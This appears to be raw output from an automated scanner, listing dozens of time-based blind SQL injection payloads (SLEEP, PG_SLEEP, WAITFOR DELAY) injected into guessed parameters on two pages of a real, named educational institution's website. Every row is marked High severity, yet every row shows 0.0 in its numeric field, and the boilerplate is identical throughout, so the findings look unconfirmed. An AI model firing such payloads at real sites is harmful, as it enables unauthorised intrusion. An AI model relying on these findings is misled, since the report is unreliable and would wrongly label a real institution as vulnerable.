Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%22+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
